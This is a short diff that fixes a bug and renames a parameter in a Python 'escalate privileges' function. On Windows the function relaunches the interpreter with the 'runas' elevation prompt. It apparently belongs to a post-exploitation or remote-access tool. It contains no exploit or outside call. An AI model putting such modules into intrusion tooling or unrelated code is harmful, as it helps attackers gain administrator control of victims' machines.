@@ -31,18 +31,19 @@ def run(filename):
     Attempt to escalate privileges
 
     `Required`
-    :param str target:    filename to run as administrator
+    :param str filename:    filename to run as administrator
+    
     """
     try:
-        if isintance(target, str) and os.path.isfile(target):
+        if isinstance(filename, str) and os.path.isfile(filename):
             if bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0):
                 return "Current user has administrator privileges"
             else:
                 if os.name == 'nt':
-                    return win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(target))
+                    return win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(filename))
                 else:
                     return "Privilege escalation not yet available on '{}'".format(sys.platform)
         else:
-            return "Error: argument 'target' must be a valid filename"
+            return "Error: argument 'filename' must be a valid filename"
     except Exception as e:
-        util.log("{} error: {}".format(self.escalate.func_name, str(e)))
+        util.log(str(e))
